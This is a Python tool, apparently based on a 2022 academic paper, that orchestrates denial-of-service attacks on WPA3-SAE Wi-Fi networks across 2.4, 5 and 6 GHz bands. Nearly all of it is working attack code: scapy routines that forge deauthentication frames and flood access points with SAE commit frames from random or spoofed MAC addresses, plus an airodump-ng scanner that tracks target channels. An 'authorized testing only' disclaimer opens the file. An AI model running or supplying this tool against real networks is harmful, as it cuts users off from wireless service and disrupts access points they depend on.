#!/usr/bin/env python3
"""
================================================================================
WPA3-SAE DoS Orchestrator (Scientific Research Edition - Tri-Band / Wi-Fi 6E)
================================================================================
Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
Journal of Information Security and Applications (2022)

FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
Use only on networks you own or have explicit permission to test.
================================================================================
"""

import subprocess
import time
import os
import sys
import glob
import random
import signal
from multiprocessing import Process, Value, Manager, Lock

# =====================================================================================
# ======================== CENTRAL CONFIGURATION ======================================
# =====================================================================================

# --- 1. TARGET DATA ---
TARGET_BSSID_6GHZ   = "AA:BB:CC:DD:EE:66"    # 6 GHz band BSSID
TARGET_BSSID_5GHZ   = "AA:BB:CC:DD:EE:55"    # 5 GHz band BSSID
TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:24"    # 2.4 GHz band BSSID

# --- 2. SAE PARAMETERS (EXTRACTED VIA EXTRACTOR SCRIPT) ---
# Each entry is a valid scalar/finite pair. Extract 20 pairs per band.

# Parameters for 2.4 GHz Network
SAE_SCALAR_2_4_HEX_LIST = [ 'INSERT_2_4_SCALAR_01_HERE' ] # Fill this with 20 values; just copy from sae_extractor.py and paste here!
SAE_FINITE_2_4_HEX_LIST = [ 'INSERT_2_4_FINITE_01_HERE' ] # Fill this with 20 values; just copy from sae_extractor.py and paste here!

# Parameters for 5 GHz Network
SAE_SCALAR_5_HEX_LIST   = [ 'INSERT_5_SCALAR_01_HERE' ]   # Fill this with 20 values; just copy from sae_extractor.py and paste here!
SAE_FINITE_5_HEX_LIST   = [ 'INSERT_5_FINITE_01_HERE' ]   # Fill this with 20 values; just copy from sae_extractor.py and paste here!

# Parameters for 6 GHz Network (Wi-Fi 6E)
SAE_SCALAR_6_HEX_LIST   = [ 'INSERT_6_SCALAR_01_HERE' ]   # Fill this with 20 values; just copy from sae_extractor.py and paste here!
SAE_FINITE_6_HEX_LIST   = [ 'INSERT_6_FINITE_01_HERE' ]   # Fill this with 20 values; just copy from sae_extractor.py and paste here!

# --- 3. OPTIONAL SCANNER ---
SCANNER_INTERFACE = ""  # e.g., "wlan2mon" or leave empty for manual channels
SCANNER_INTERVAL  = 30   
SCANNER_DURATION  = 10   

# --- 4. MANUAL CHANNEL ASSIGNMENT ---
MANUAL_CHANNEL_6GHZ   = "5"      # Typical 6 GHz channel (e.g. 1, 5, 9, 37...)
MANUAL_CHANNEL_5GHZ   = "36"     # Typical 5 GHz channel
MANUAL_CHANNEL_2_4GHZ = "1"      # Typical 2.4 GHz channel

# --- 5. TARGET CLIENTS (For targeted attacks like Deauth-Flood) ---
TARGET_STA_MACS =[
    "11:22:33:44:55:66",
]

# --- 6. AMPLIFICATION REFLECTORS ---
AMPLIFICATION_REFLECTOR_APS_6GHZ   = [ "AA:BB:CC:DD:EE:61", "AA:BB:CC:DD:EE:62" ]
AMPLIFICATION_REFLECTOR_APS_5GHZ   = [ "AA:BB:CC:DD:EE:51", "AA:BB:CC:DD:EE:52" ]
AMPLIFICATION_REFLECTOR_APS_2_4GHZ = [ "AA:BB:CC:DD:EE:21", "AA:BB:CC:DD:EE:22" ]

# ====================== ENCYCLOPEDIA OF ATTACKS ======================
#
# Here you will find a detailed explanation for each available attack type.
# Based on the scientific paper: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
#
# --- Category: Client Direct Attacks ---
#
# "deauth_flood": Classic deauth attack for forcible disconnection.
#
# --- Category: WPA3-Specific Attacks (Modern) ---
#
# "omnivore": Strongest flooding attack with constantly changing MACs.
#     Effect: Floods the router with WPA3 connection attempts from ever-changing, random MAC addresses.
#             This forces the router to reserve memory (RAM) for each attempt until it is full.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3 (Very effective). WPA2 APs usually discard the packets without much load.
#
# "muted": Flooding attack with a single, static MAC.
#     Effect: Similar to "omnivore", but all attacks come from the same MAC address. This aims to
#             bypass specific defense mechanisms that only react to attacks from many sources.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "hasty": Confusion attack with Commit & Confirm packets.
#     Effect: Sends not only the first step of the WPA3 handshake (Commit) but also immediately the second (Confirm).
#             This aims to confuse the router\'s state machine and generate CPU load.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "double_decker": Combines "omnivore" & "muted" for maximum stress.
#     Effect: Described by the authors as "powerful". It attacks the router simultaneously
#             before and after its anti-DoS defense is activated. Maximum memory and CPU load.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "cookie_guzzler": Exploits the faulty re-transmission behavior of APs.
#     Effect: Sends SAE Commit frames in "bursts" from random MAC addresses to force the AP to
#             send a disproportionately large number of response frames, thereby overloading itself.
#     Suitable for: WPA3.
#
# --- Category: Universal & Vendor-Specific Attacks ---
#
# "open_auth": Classic DoS attack with Open Authentication requests.
#     Effect: A "Legacy" attack that floods the router with simple, old authentication requests.
#             According to studies, this is particularly effective at overloading the basic CPU queue.
#     Most effective band: 5 GHz (According to study, most effective here).
#     Suitable for: WPA2 and WPA3 (Universally effective). 5 GHz.
#
# "amplification": Spoofs sender MACs of legitimate devices.
#     Effect: The attacker sends packets to the target AP but spoofs the sender MAC address of another
#             device in the network. The target AP responds to the innocent device, clogging the channel.
#     Most effective band: 2.4 GHz (According to study, most effective here as this band is often more crowded).
#     Suitable for: WPA2 and WPA3 (Universally effective, as WPA2 devices also respond with error messages
#                   that clog the channel) 2.4 GHz Band.
#
# "radio_confusion": GENERIC Cross-Band Attack (Broadcom & MediaTek).
#     Effect: Sends SAE frames to the BSSID of the *opposite* band.
#     Mechanism: - If you start the attack on the 2.4 GHz band, the 5 GHz network is targeted/crashed.
#                - If you start the attack on the 5 GHz band, the 2.4 GHz network is targeted/crashed.
#     Why generic? This script automatically detects the adapter\'s band and targets the opposite one.
#                  It covers specific vendor vulnerabilities described in the paper:
#                  - Case 6 (Broadcom) & Case 13 Reverse (MediaTek) -> Attack from 2.4GHz to crash 5GHz.
#                  - Case 6 Reverse (Broadcom) & Case 13 (MediaTek) -> Attack from 5GHz to crash 2.4GHz.
#     Note: In the \'Master\' script, these are split into specific cases. Here, one logic rules them all.
#
# "back_to_the_future": Overloads the memory of a WPA2 AP with WPA3 packets.
#     Effect: Exploits a bug in some WPA2 APs that react incorrectly to WPA3 packets. The attack floods
#             the WPA2 AP with these packets to fill its memory and cause it to crash.
#     Most effective band: Both bands (Universal, targets WPA2 APs).
#     Suitable for: WPA2 (Specifically targets WPA2 APs).
#
# ==============================================================================================

# ======================== ADAPTER CONFIGURATION ======================================
ADAPTER_CONFIGURATION = {
    # "wlan3mon": {"band": "6GHz", "attack": "omnivore"},
    # "wlan2mon": {"band": "5GHz", "attack": "cookie_guzzler"},
    # "wlan1mon": {"band": "2.4GHz", "attack": "double_decker"},
    "wlan0mon": {"band": "6GHz", "attack": "cookie_guzzler"} # Example: Only 6GHz active
}

# ==============================================================================================
# ================= SCIENTIFIC CONFIGURATION ===================================================
# ==============================================================================================
# Anti-Clogging Thresholds (Table 2 in the paper)
ANTI_CLOGGING_THRESHOLD = 5        # dot11RSNASAEAntiCloggingThreshold (default for most APs)
RETRANS_PERIOD_MS = 40             # dot11RSNASAERetransPeriod (40ms for most APs)
SAE_SYNC = 5                       # dot11RSNASAESync (max retransmissions)
AP_MAX_INACTIVITY = 300            # AP_MAX_INACTIVITY timeout in seconds (300s for most APs)

# Scientific attack parameters (From methodology section)
BURST_SIZE = 128                   # Study uses 128-frame bursts (page 5)
GROUP_ID = 19                      # ECC Group 19 (256-bit) - Only mandatory group

# PMF SA Query Timeouts (Section 5 of the paper)
SA_QUERY_MAX_TIMEOUT = 1.0         # 1000ms maximum wait for SA Query response
SA_QUERY_RETRY_TIMEOUT = 0.201     # 201ms retry timeout               

# ======================== SHARED MEMORY FOR SCANNER =================================
shared_channels = Manager().dict({
    '2.4GHz': MANUAL_CHANNEL_2_4GHZ,
    '5GHz':   MANUAL_CHANNEL_5GHZ,
    '6GHz':   MANUAL_CHANNEL_6GHZ
})
channel_lock = Lock()

# ======================== HELPER FUNCTIONS ==========================================
def get_freq(band, channel):
    """Converts channel numbers to MHz based on the operating band."""
    ch = int(channel)
    if band == '2.4GHz':
        if ch == 14: return 2484
        return 2407 + (ch * 5)
    elif band == '5GHz':
        return 5000 + (ch * 5)
    elif band == '6GHz':
        return 5945 + (ch * 5)
    return 2412

def parse_airodump_csv(csv_file):
    results = {}
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        sections = content.split('\n\n')
        if len(sections) >= 1:
            ap_section = sections[0]
            lines = ap_section.strip().split('\n')
            
            for line in lines:
                if 'BSSID' in line or line.startswith('#') or not line.strip(): continue
                parts = line.split(',')
                if len(parts) >= 14:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    if not channel or not channel.isdigit(): continue
                    
                    if bssid.upper() == TARGET_BSSID_2_4GHZ.upper(): results['2.4GHz'] = channel
                    elif bssid.upper() == TARGET_BSSID_5GHZ.upper(): results['5GHz'] = channel
                    elif bssid.upper() == TARGET_BSSID_6GHZ.upper(): results['6GHz'] = channel
        return results
    except: return {}

def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
    if not scanner_iface: return
    
    print(f"[SCANNER] Starting on {scanner_iface} (Includes 6GHz scanning if supported)")
    for f in glob.glob("/tmp/scan_*"):
        try: os.remove(f)
        except: pass
    
    while True:
        try:
            timestamp = int(time.time())
            prefix = f"/tmp/scan_{timestamp}"
            
            # Using --band abg6 for modern airodump-ng 6GHz support
            cmd = ['airodump-ng', '--write', prefix, '--output-format', 'csv', '--band', 'abg6', '--write-interval', '2', scanner_iface]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(scan_duration)
            
            if proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=2)
            
            csv_files = glob.glob(f"{prefix}-*.csv")
            if csv_files:
                latest_csv = max(csv_files, key=os.path.getctime)
                found_channels = parse_airodump_csv(latest_csv)
                
                with lock:
                    for b in ['2.4GHz', '5GHz', '6GHz']:
                        if found_channels.get(b):
                            if shared_dict.get(b) != found_channels[b]:
                                shared_dict[b] = found_channels[b]
                                print(f"\n[SCANNER] {b}: Channel updated → {found_channels[b]}")
            
            for f in glob.glob(f"{prefix}*"):
                try: os.remove(f)
                except: pass
            
            with lock:
                print(f"\r[SCANNER] 2.4G={shared_dict.get('2.4GHz')} | 5G={shared_dict.get('5GHz')} | 6G={shared_dict.get('6GHz')} ", end="")
                sys.stdout.flush()
            time.sleep(max(0, interval - scan_duration))
        except KeyboardInterrupt: break
        except Exception: time.sleep(5)

# ======================== ATTACK FUNCTIONS ==========================================
def run_attacker_process(interface, band, bssid, channel, attack_type, scalar_hex_list, finite_hex_list, 
                         counter, sta_macs=None, amplification_targets=None, opposite_bssid=None):
    from scapy.all import RandMAC, Dot11, RadioTap, Dot11Auth, Dot11Deauth, sendp
    
    # 1. 6GHz/5GHz/2.4GHz Compatible Channel Setting
    freq = get_freq(band, channel)
    try:
        # Utilizing 'iw' instead of 'iwconfig' because 'iwconfig' fails for 6GHz
        subprocess.run(['iw', 'dev', interface, 'set', 'freq', str(freq)], 
                      check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[ATTACK] {interface} set to freq {freq}MHz (Ch {channel}) -> {attack_type}")
    except Exception as e:
        print(f"[ERROR] {interface}: Failed to set frequency {freq}MHz: {e}")
        return

    # 2. Decode Lists
    try:
        # Replaced spaces just in case user formatting is messy
        SAE_SCALAR_BYTES_LIST = [bytes.fromhex(s.strip().replace(" ", "")) for s in scalar_hex_list if "INSERT" not in s]
        SAE_FINITE_BYTES_LIST = [bytes.fromhex(f.strip().replace(" ", "")) for f in finite_hex_list if "INSERT" not in f]
        if not SAE_SCALAR_BYTES_LIST or not SAE_FINITE_BYTES_LIST:
            raise ValueError(f"SAE Parameter lists for {band} contain placeholders or are empty.")
    except Exception as e:
        print(f"[ERROR] {interface}: Hex decoding failed. Check your arrays: {e}")
        return
        
    def get_random_sae_params():
        idx = random.randint(0, min(len(SAE_SCALAR_BYTES_LIST), len(SAE_FINITE_BYTES_LIST)) - 1)
        return SAE_SCALAR_BYTES_LIST[idx], SAE_FINITE_BYTES_LIST[idx]
    
    target_bssid_frame = opposite_bssid if attack_type == "radio_confusion" else bssid
    
    # 3. ATTACK LOGIC
    try:
        while True:
            packet_list = []
            
            if attack_type == "deauth_flood":
                targets = (sta_macs or []) + ["ff:ff:ff:ff:ff:ff"]
                for sta in targets:
                    pkt = RadioTap()/Dot11(addr1=sta, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                    packet_list.extend([pkt] * 10)
            
            elif attack_type == "omnivore":
                unique_macs = [str(RandMAC()) for _ in range(ANTI_CLOGGING_THRESHOLD - 1)]
                for mac_use in unique_macs:
                    s, f = get_random_sae_params()
                    pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=target_bssid_frame, addr2=mac_use, addr3=target_bssid_frame)/
                           Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/s/f)
                    packet_list.append(pkt)
            
            elif attack_type == "cookie_guzzler" or attack_type == "muted":
                static_mac = sta_macs[0] if (sta_macs and attack_type == "muted") else str(RandMAC())
                s, f = get_random_sae_params()
                for _ in range(BURST_SIZE):
                    pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=target_bssid_frame, addr2=static_mac, addr3=target_bssid_frame)/
                           Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/s/f)
                    packet_list.append(pkt)
            
            elif attack_type == "double_decker":
                for _ in range(64):
                    s, f = get_random_sae_params()
                    pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/
                           Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/s/f)
                    packet_list.append(pkt)
                s, f = get_random_sae_params()
                fixed_mac = sta_macs[0] if sta_macs else "00:11:22:33:44:55"
                pkt_fixed = (RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=fixed_mac, addr3=bssid)/
                             Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/s/f)
                packet_list.extend([pkt_fixed] * 64)
                
            elif attack_type == "radio_confusion":
                for _ in range(BURST_SIZE):
                    s, f = get_random_sae_params()
                    pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=target_bssid_frame, addr2=str(RandMAC()), addr3=target_bssid_frame)/
                           Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/s/f)
                    packet_list.append(pkt)

            else:
                for _ in range(BURST_SIZE):
                    s, f = get_random_sae_params()
                    pkt = (RadioTap()/Dot11(type=0, subtype=11, addr1=target_bssid_frame, addr2=str(RandMAC()), addr3=target_bssid_frame)/
                           Dot11Auth(algo=3, seqnum=1, status=0)/b'\x13\x00'/s/f)
                    packet_list.append(pkt)
            
            if packet_list:
                try:
                    sendp(packet_list, count=1, inter=0, iface=interface, verbose=0)
                    with counter.get_lock():
                        counter.value += len(packet_list)
                    time.sleep(0.02 if attack_type in ["omnivore", "double_decker"] else 0.01)
                except OSError: time.sleep(0.1)
                except Exception as e:
                    print(f"[SEND ERROR] {interface}: {e}")
                    time.sleep(0.1)
    
    except KeyboardInterrupt: pass
    except Exception as e: print(f"[CRASH] {interface}: {e}")

# ======================== MAIN ORCHESTRATOR =========================================
def cleanup(procs, scanner_proc=None):
    print("\n[INFO] Terminating processes...")
    for interface, proc in procs.items():
        if proc and proc.is_alive():
            proc.terminate()
            proc.kill()
    if scanner_proc and scanner_proc.is_alive():
        scanner_proc.terminate()
        scanner_proc.kill()
    sys.exit(0)

def main():
    if os.geteuid() != 0: sys.exit("[ERROR] Must be run as root! Use: sudo python3 script.py")
    
    print("="*70)
    print("WPA3-SAE DoS Orchestrator (Tri-Band / Wi-Fi 6E Edition)")
    print("="*70)
    
    signal.signal(signal.SIGINT, lambda s, f: cleanup(procs, scanner_proc))
    signal.signal(signal.SIGTERM, lambda s, f: cleanup(procs, scanner_proc))
    
    scanner_proc = None
    if SCANNER_INTERFACE:
        scanner_proc = Process(target=scanner_process, args=(SCANNER_INTERFACE, SCANNER_INTERVAL, SCANNER_DURATION, shared_channels, channel_lock))
        scanner_proc.daemon = True
        scanner_proc.start()
        time.sleep(3)
    
    global procs
    procs = {}
    counters = {iface: Value('L', 0) for iface in ADAPTER_CONFIGURATION}
    active_channels = {}
    
    try:
        while True:
            for interface, config in ADAPTER_CONFIGURATION.items():
                band = config['band']
                attack = config['attack']
                
                with channel_lock:
                    target_channel = shared_channels.get(band)
                
                restart_needed = False
                if interface not in procs or not procs[interface].is_alive():
                    restart_needed = True
                elif active_channels.get(interface) != target_channel:
                    restart_needed = True
                
                if restart_needed:
                    if interface in procs and procs[interface].is_alive():
                        procs[interface].terminate()
                        procs[interface].kill()
                    
                    # Logic for cross-band attacks extended to 3 bands
                    if attack == "radio_confusion":
                        if band == '6GHz':
                            target_band_logic, opposite_bssid = '5GHz', TARGET_BSSID_5GHZ
                        elif band == '5GHz':
                            target_band_logic, opposite_bssid = '2.4GHz', TARGET_BSSID_2_4GHZ
                        else:
                            target_band_logic, opposite_bssid = '5GHz', TARGET_BSSID_5GHZ
                    else:
                        target_band_logic = band
                        opposite_bssid = None
                    
                    # Select parameters based on logical target band
                    if target_band_logic == '6GHz':
                        s_hex_list, f_hex_list = SAE_SCALAR_6_HEX_LIST, SAE_FINITE_6_HEX_LIST
                        target_bssid, reflectors = TARGET_BSSID_6GHZ, AMPLIFICATION_REFLECTOR_APS_6GHZ
                    elif target_band_logic == '5GHz':
                        s_hex_list, f_hex_list = SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST
                        target_bssid, reflectors = TARGET_BSSID_5GHZ, AMPLIFICATION_REFLECTOR_APS_5GHZ
                    else:
                        s_hex_list, f_hex_list = SAE_SCALAR_2_4_HEX_LIST, SAE_FINITE_2_4_HEX_LIST
                        target_bssid, reflectors = TARGET_BSSID_2_4GHZ, AMPLIFICATION_REFLECTOR_APS_2_4GHZ
                    
                    p = Process(target=run_attacker_process,
                                args=(interface, band, target_bssid, target_channel, attack, 
                                      s_hex_list, f_hex_list, counters[interface]),
                                kwargs={'sta_macs': TARGET_STA_MACS, 'amplification_targets': reflectors, 'opposite_bssid': opposite_bssid})
                    p.daemon = True
                    procs[interface] = p
                    active_channels[interface] = target_channel
                    p.start()
            
            with channel_lock:
                channel_status = f"2.4G={shared_channels.get('2.4GHz')}|5G={shared_channels.get('5GHz')}|6G={shared_channels.get('6GHz')}"
            
            attack_status = " - ".join([f"{iface}:{counters[iface].value}" for iface in ADAPTER_CONFIGURATION])
            sys.stdout.write(f"\r[STATUS] {channel_status} || {attack_status}   ")
            sys.stdout.flush()
            time.sleep(2)
            
    except KeyboardInterrupt:
        cleanup(procs, scanner_proc)

if __name__ == "__main__":
    main()